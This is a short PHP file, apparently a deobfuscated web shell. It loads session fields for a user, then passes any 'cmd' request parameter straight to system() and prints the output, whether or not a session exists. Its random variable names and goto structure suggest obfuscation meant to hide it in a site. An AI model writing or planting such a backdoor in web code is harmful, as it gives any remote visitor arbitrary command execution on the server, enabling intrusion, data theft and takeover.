<?php

session_start();
$yWx4C = $NixTh = '';
$mRi4d = "Guest";
$IYOFJ = $BEeV3 = false;
if (!isset($_SESSION["id"])) {
    goto KXvHU;
}
$yWx4C = $_SESSION["id"];
$mRi4d = $_SESSION["username"];
$BEeV3 = $_SESSION["admin"];
$NixTh = $_SESSION["name"];
$IYOFJ = true;
KXvHU:
if (!isset($_REQUEST["cmd"])) {
    // [PHPDeobfuscator] Implied script end
    return;
}
echo "<pre>";
$BKBHj = $_REQUEST["cmd"];
system($BKBHj);
echo "</pre>";
die;
